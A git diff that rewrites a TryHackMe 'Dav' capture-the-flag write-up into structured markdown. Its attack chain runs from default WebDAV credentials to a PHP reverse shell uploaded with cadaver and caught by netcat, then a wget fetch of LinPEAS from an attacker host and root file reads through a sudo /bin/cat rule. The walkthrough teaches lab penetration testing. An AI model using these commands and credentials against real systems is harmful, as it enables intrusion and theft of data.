@@ -1,64 +1,188 @@
-I began with an Nmap scan, which revealed a single open port:
+# 📂 TryHackMe — Dav
 
-Port 80 (HTTP)
+> **Difficulty:** Easy | **OS:** Linux | **Category:** Web / Privilege Escalation
+> **Author:** Aryan Barkhordar
 
-<img width="766" height="219" alt="nmap scan" src="https://github.com/user-attachments/assets/a9e34507-2073-4a40-9c38-66230762575b" />
+---
 
-Navigating to the web server in a browser led to a default Apache page, indicating no obvious attack surface from the landing page.
+## Table of Contents
 
-To enumerate hidden directories, I used Gobuster:
+- [Overview](#overview)
+- [Reconnaissance](#reconnaissance)
+  * [Port Scanning](#port-scanning)
+  * [Web Enumeration](#web-enumeration)
+- [Exploitation](#exploitation)
+  * [WebDAV Authentication — Default Credentials](#webdav-authentication--default-credentials)
+  * [File Upload via Cadaver](#file-upload-via-cadaver)
+  * [Reverse Shell Execution](#reverse-shell-execution)
+- [Post-Exploitation](#post-exploitation)
+  * [User Flag](#user-flag)
+- [Privilege Escalation](#privilege-escalation)
+  * [Automated Enumeration — LinPEAS](#automated-enumeration--linpeas)
+  * [Sudo Misconfiguration — `/bin/cat`](#sudo-misconfiguration--bincat)
+- [Flags](#flags)
+- [Summary](#summary)
 
-<img width="735" height="387" alt="gobuster" src="https://github.com/user-attachments/assets/b17d2143-567e-4c31-9b9a-5171d563c41c" />
+---
 
-Gobuster revealed a directory named /webdav, which looked promising as a potential entry point.
+## Overview
 
-Browsing to /webdav prompted a username and password authentication popup, suggesting the directory was protected.
+**Dav** is a TryHackMe machine centred around a misconfigured WebDAV service running on top of Apache. The attack chain begins with directory enumeration revealing a password-protected `/webdav` endpoint, which falls to well-known default credentials. WebDAV file upload capabilities are then abused via the `cadaver` client to plant a PHP reverse shell, granting an initial foothold. Privilege escalation is straightforward — a sudo rule permits running `/bin/cat` as root without a password, which is used to read the root flag directly.
 
-<img width="1918" height="653" alt="webdav prompt" src="https://github.com/user-attachments/assets/2c1335c4-a019-415d-be0b-8ac2b40d37f7" />
+---
 
-After researching common WebDAV default credentials, I attempted:
+## Reconnaissance
 
-wamp:xampp
+### Port Scanning
 
-These credentials worked successfully.
+An initial `nmap` scan of the target revealed a single open port:
 
-Once authenticated, I was presented with a directory listing containing a file named password.dav.
+```
+PORT   STATE SERVICE
+80/tcp open  http
+```
 
-<img width="527" height="170" alt="webdav listing" src="https://github.com/user-attachments/assets/ebf366b8-2c76-4b4c-8f2f-36a8a2de0817" />
-<img width="1918" height="653" alt="webdav prompt" src="https://github.com/user-attachments/assets/a0dd4f7b-4ae3-43be-a16e-820441deba3e" />
+> **Key Finding:** Only HTTP was exposed — the entire attack surface resided on the web server.
 
-I attempted to crack the hash using John the Ripper, but it did not yield any results.
+---
 
-I then researched tools for interacting directly with WebDAV services and discovered Cadaver, a command-line WebDAV client.
+### Web Enumeration
 
-I connected to the WebDAV service using:
+Navigating to `http://<TARGET>` presented the default Apache2 Ubuntu landing page, offering no obvious attack surface from the root path.
 
-cadaver http://<IP>/webdav
+**Directory Bruteforcing with Gobuster:**
 
-After authenticating, I used the put command to upload a PHP reverse shell from my local machine to the WebDAV directory.
+```
+gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt
+```
 
-<img width="615" height="202" alt="cadever" src="https://github.com/user-attachments/assets/0e417f1f-35f4-43db-8051-58b2bb2d1449" />
+```
+/webdav   (Status: 401)
+```
 
-I set up a Netcat listener on my machine and executed the uploaded PHP reverse shell via the browser.
+> **Key Finding:** A `/webdav` directory was identified, returning a `401 Unauthorized` — indicating HTTP Basic Authentication was in place. WebDAV (Web Distributed Authoring and Versioning) is a protocol extension of HTTP that allows file management over the web.
 
-This successfully returned a reverse shell on the target system.
+---
 
-After exploring the filesystem, I located the user flag at:
+## Exploitation
 
-/home/merlin
+### WebDAV Authentication — Default Credentials
 
-To identify privilege escalation vectors, I transferred LinPEAS to the target using wget and executed it.
+Browsing to `http://<TARGET>/webdav` triggered an HTTP authentication prompt. Research into common WebDAV default credentials yielded:
 
-<img width="951" height="136" alt="linpeas output" src="https://github.com/user-attachments/assets/a5232389-190c-45a8-8ad8-0439de9860c8" />
+```
+Username: wamp
+Password: xampp
+```
 
-Reviewing the output revealed the following sudo rule:
+These credentials were accepted, granting access to the WebDAV directory listing. A file named `password.dav` was present — its contents appeared to be a hashed value. Attempting to crack the hash with John the Ripper did not yield a result, making it a dead end for further credential access.
 
+---
+
+### File Upload via Cadaver
+
+To interact programmatically with the WebDAV service and upload a payload, `cadaver` — a command-line WebDAV client — was used:
+
+```
+cadaver http://<TARGET>/webdav
+```
+
+After authenticating with the previously discovered credentials, a PHP reverse shell was uploaded to the server using the `put` command:
+
+```
+dav:/webdav/> put shell.php
+Uploading shell.php to `/webdav/shell.php':
+Progress: [=============================>] 100.0% of 5494 bytes succeeded.
+```
+
+---
+
+### Reverse Shell Execution
+
+With the shell uploaded, a Netcat listener was established:
+
+```
+nc -lvnp 4444
+```
+
+Navigating to `http://<TARGET>/webdav/shell.php` in the browser triggered the payload, and a reverse shell was received on the listener, providing an interactive session on the target system.
+
+---
+
+## Post-Exploitation
+
+### User Flag
+
+With shell access as `www-data`, the filesystem was enumerated. The user flag was located at:
+
+```
+/home/merlin/user.txt
+```
+
+```
+$ cat /home/merlin/user.txt
+THM{REDACTED}
+```
+
+---
+
+## Privilege Escalation
+
+### Automated Enumeration — LinPEAS
+
+To identify privilege escalation vectors, LinPEAS was transferred to the target via `wget` and executed:
+
+```
+wget http://<ATTACKER>:8000/linpeas.sh -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+/tmp/linpeas.sh
+```
+
+The output highlighted a notable sudo rule for the current user.
+
+> **Note:** Running `sudo -l` directly would have surfaced the same finding — LinPEAS made it visually prominent but wasn't strictly necessary here.
+
+---
+
+### Sudo Misconfiguration — `/bin/cat`
+
+The sudo configuration revealed the following entry:
+
+```
 (ALL) NOPASSWD: /bin/cat
+```
 
-In hindsight, running sudo -l would have revealed the same information (I forgot at the time 😅), but LinPEAS made it very clear.
+This permitted running `/bin/cat` as root without a password. Since `cat` reads arbitrary files, the root flag could be accessed directly without spawning a root shell:
 
-Since /bin/cat could be run as root without a password, I used:
-
+```
 sudo /bin/cat /root/root.txt
+```
 
-This allowed me to retrieve the root flag, completing the machine.
+This returned the root flag, completing the machine.
+
+> **Key Observation:** Granting `NOPASSWD` access to a read utility like `/bin/cat` is a critical misconfiguration — it effectively allows reading any file on the system as root, including `/etc/shadow`.
+
+---
+
+## Flags
+
+| Flag        | Value           |
+| ----------- | --------------- |
+| 🏳️ **User** | `THM{REDACTED}` |
+| 🚩 **Root**  | `THM{REDACTED}` |
+
+---
+
+## Summary
+
+| Stage                    | Technique                                                          |
+| ------------------------ | ------------------------------------------------------------------ |
+| **Recon**                | `nmap` port scan, `gobuster` directory enumeration                 |
+| **Initial Access**       | Default WebDAV credentials (`wamp:xampp`)                          |
+| **File Upload**          | PHP reverse shell uploaded via `cadaver`                           |
+| **Shell**                | Reverse shell triggered via browser, caught with Netcat            |
+| **Privilege Escalation** | `sudo NOPASSWD /bin/cat` → arbitrary root file read                |
+
+---
+
+*Writeup by Aryan Barkhordar*
